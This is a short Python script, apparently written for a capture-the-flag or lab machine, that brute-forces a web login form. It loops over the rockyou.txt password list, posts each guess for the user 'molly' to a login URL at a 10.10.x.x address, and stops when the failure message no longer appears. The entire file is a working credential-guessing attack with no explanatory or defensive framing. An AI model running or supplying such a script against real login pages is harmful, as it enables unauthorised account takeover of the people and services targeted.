import grequests
import sys

passwords = [ x.strip() for x in open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') if x ]

for password in passwords:
	
	data = {
  	'username': 'molly',
  	'password': password
	}

	print("[*] Trying Password: " + password)

	response = grequests.post('http://10.10.68.121/login', data=data)
	responses_list = grequests.map([response])
	if "Your username or password is incorrect." not in responses_list[0].text:
		print("[+] Password Found: " + password)
		sys.exit(0)

